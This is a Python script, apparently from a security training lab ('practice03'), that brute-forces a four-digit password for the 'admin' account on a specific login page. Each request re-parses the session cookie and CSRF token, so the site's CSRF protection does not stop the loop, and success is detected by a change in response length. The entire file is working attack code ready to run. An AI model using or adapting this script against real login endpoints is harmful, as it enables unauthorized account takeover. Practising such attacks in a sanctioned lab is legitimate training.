import requests
from bs4 import BeautifulSoup
import time

A = 'D37183F5381047F99E9BB7178CDC3EFF' # 초기 세션아이디
B = "85158c10-d0c0-4e92-b257-bbc232046e46" # 초기 csrf 토큰
PW = '1234'

url = "https://elms2.skinfosec.co.kr:8110/practice/practice03/login"
cookie = {'JSESSIONID': A} # 쿠키 값 넣기
param = {"_csrf": B,"memberid": "admin","password": PW }

req = requests.post(url, data = param, cookies = cookie)
# req.text에 포함된 HTML을 BeautifulSoup으로 파싱합니다.
soup = BeautifulSoup(req.text, 'html.parser')
# id가 'abc'인 input 태그를 찾습니다.
#input_tag = soup.find('input', name='_csrf')
input_tag = soup.find('input', attrs={'name': '_csrf'})
# input 태그의 value 속성 값을 가져옵니다.
value = input_tag.get('value')

print('스테이터스코드 : ', req.status_code)
print('세션아이디 : ',(req.history[0].headers['Set-Cookie'])[11:43])
print('csrf토큰 :',value)
print('길이:',len(req.text))

var1 = (req.history[0].headers['Set-Cookie'])[11:43]
var2 = value
var3 = len(req.text)
A = var1
B = var2

for num in range(4055,10000):
    num_str = str(num).zfill(4)  # 0으로 채워진 4자리 숫자 문자열 생성
    print(num_str)
    PW = num_str
    
    url = "https://elms2.skinfosec.co.kr:8110/practice/practice03/login"
    cookie = {'JSESSIONID': A} # 쿠키 값 넣기
    param = {"_csrf": B,"memberid": "admin","password": PW }

    req = requests.post(url, data = param, cookies = cookie)
    # req.text에 포함된 HTML을 BeautifulSoup으로 파싱합니다.
    soup = BeautifulSoup(req.text, 'html.parser')
    # id가 'abc'인 input 태그를 찾습니다.
    #input_tag = soup.find('input', name='_csrf')
    input_tag = soup.find('input', attrs={'name': '_csrf'})
    # input 태그의 value 속성 값을 가져옵니다.
    value = input_tag.get('value')

    print('스테이터스코드 : ', req.status_code)
    print('세션아이디 : ',(req.history[0].headers['Set-Cookie'])[11:43])
    print('csrf토큰 :',value)
    print('길이:',len(req.text))

    var1 = (req.history[0].headers['Set-Cookie'])[11:43]
    var2 = value
    var3 = len(req.text)
    A = var1
    B = var2
    
    
    if var3 != 6292:
        break
print("gdgd")

